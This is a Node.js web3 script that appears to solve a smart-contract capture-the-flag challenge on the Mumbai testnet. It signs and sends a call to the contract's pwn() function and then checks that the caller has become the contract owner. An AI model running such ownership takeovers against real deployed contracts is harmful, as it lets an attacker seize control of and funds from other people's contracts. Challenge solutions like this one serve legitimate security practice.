const Web3 = require('web3');
const web3 = new Web3('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"type":"function","name":"pwn","constant":false,"payable":false,"inputs":[],"outputs":[]},{"type":"function","name":"owner","constant":true,"stateMutability":"view","payable":false,"inputs":[],"outputs":[{"type":"address"}]}];

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new web3.eth.Contract(contractAbi, contractAddress);
    const account = new web3.eth.accounts.privateKeyToAccount(privateKey);

    if (await isSolved(account, contract)) {
        console.log('already solved');
        return;
    }

    console.log('calling pwn()...');
    const pwnTx = await contract.methods.pwn();
    const pwnTxOpts = {
        to: contractAddress,
        data: pwnTx.encodeABI(),
        gas: await pwnTx.estimateGas({from: account.address}),
        gasPrice: await web3.eth.getGasPrice(),
    };
    const signedPwnTx = await web3.eth.accounts.signTransaction(pwnTxOpts, privateKey);
    await web3.eth.sendSignedTransaction(signedPwnTx.rawTransaction);

    console.log('checking contract ownership...');
    if (await isSolved(account, contract)) {
        console.log('solved');
    } else {
        console.log('could get contract ownership. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(account, contract) {
    const owner = await contract.methods.owner().call();
    return owner == account.address;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
